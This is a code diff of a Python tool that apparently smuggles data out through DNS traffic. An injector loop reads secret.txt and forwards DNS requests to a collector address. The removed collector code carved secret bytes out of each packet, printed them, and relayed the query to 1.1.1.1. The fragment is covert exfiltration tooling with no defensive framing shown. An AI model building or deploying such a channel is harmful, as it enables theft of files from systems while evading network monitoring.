@@ -44,14 +44,6 @@ def encode_data(data):
     return data
 
 
-def decode_data(data):
-    secret = data[7:12]
-    print(secret)
-    padding: bytes = b'\x00' * 6
-    data = data[0:6] + padding + data[12:]
-    return data, secret
-
-
 def load_secret_text_to_mem() -> bytes:
     f = open("secret.txt", 'rb')
     while True:
@@ -76,15 +68,6 @@ def main_injector_loop(udps):
         data, addr, type, domain, answer = receive_data(udps)
         data = encode_data(data)
         answer = forward_dns_request(data, collector_ip)
-        udps.sendto(answer, addr)
-
-
-def main_collector_loop(udps):
-    while True:
-        data, addr, type, domain, answer = receive_data(udps)
-        data, secret = decode_data(data)
-        print(secret)
-        answer = forward_dns_request(data, '1.1.1.1')
         udps.sendto(answer, addr)
 
 
